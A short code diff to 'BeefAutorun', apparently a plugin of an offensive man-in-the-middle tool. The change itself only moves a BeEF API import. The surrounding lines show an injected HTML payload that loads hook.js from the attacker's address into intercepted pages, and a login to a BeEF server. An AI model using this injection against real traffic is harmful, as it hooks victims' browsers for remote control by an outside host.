@@ -22,8 +22,8 @@ import logging
 import sys
 import json
 import threading
-import core.beefapi as beefapi
 
+from core.beefapi.beefapi import BeefAPI
 from plugins.plugin import Plugin
 from plugins.Inject import Inject
 from time import sleep
@@ -62,7 +62,7 @@ class BeefAutorun(Inject, Plugin):
 		self.black_ips = []
 		self.html_payload = '<script type="text/javascript" src="http://%s:%s/hook.js"></script>' % (self.ip_address, beefconfig['beefport'])
 		
-		beef = beefapi.BeefAPI({"host": beefconfig['beefip'], "port": beefconfig['beefport']})
+		beef = BeefAPI({"host": beefconfig['beefip'], "port": beefconfig['beefport']})
 		if not beef.login(beefconfig['user'], beefconfig['pass']):
 			sys.exit("[-] Error logging in to BeEF!")
 
